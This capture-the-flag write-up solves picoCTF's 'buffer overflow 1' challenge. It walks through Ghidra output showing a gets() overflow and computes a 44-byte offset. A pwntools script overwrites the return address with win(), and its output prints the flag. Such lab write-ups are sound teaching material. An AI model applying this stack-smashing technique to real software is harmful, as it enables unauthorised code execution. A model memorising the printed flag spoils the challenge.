# buffer overflow 1 Writeup

## Steps:
1. Open in ghidra and analyze
        - Notice functions called `vuln` and `win`
```
void vuln(void)

{
  undefined4 uVar1;
  char input [36];
  
  gets(input);
  uVar1 = get_return_address();
  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n",uVar1);
  return;
}

```
Win just prints out the flag. The plan is to overflow the input to replace the return address with `win`

2. Based on the stack variable layout, we need to overwrite up to the return address. This `0x2c bytes` or `44`.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined vuln()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     080492bf(R)  
             undefined1[36]    Stack[-0x2c]   input                                   XREF[1]:     0804929a(*)  
                             vuln                                            XREF[4]:     Entry Point(*), main:0804932a(c), 
                                                                                          0804a0e8, 0804a1a0(*)  
        08049281 f3 0f 1e fb     ENDBR32

```

3. Next, we need to find the address of `win` to return to. This is found in ghidra to be `0x080491f6`.
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined win()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     0804927c(R)  
             undefined4        Stack[-0x10]:4 local_10                                XREF[3]:     08049225(W), 
                                                                                                   08049228(R), 
                                                                                                   0804925b(R)  
             undefined1        Stack[-0x50]:1 local_50                                XREF[2]:     08049260(*), 
                                                                                                   0804926f(*)  
                             win                                             XREF[3]:     Entry Point(*), 0804a0e0, 
                                                                                          0804a17c(*)  
        080491f6 f3 0f 1e fb     ENDBR32

```

4. Create the payload: 44 bytes to overwrite then add the address of win. Send the payload to the process.
```
from pwn import *

# p = process("./vuln")
p = remote("saturn.picoctf.net",52456)

win = 0x080491f6

payload = b"A" * 44
payload += p32(win)

p.sendline(payload)

s = p.recvall().decode()
print(s)
```


## Solution:
```
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 52456: Done
[+] Receiving all data: Done (127B)
[*] Closed connection to saturn.picoctf.net port 52456
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
```

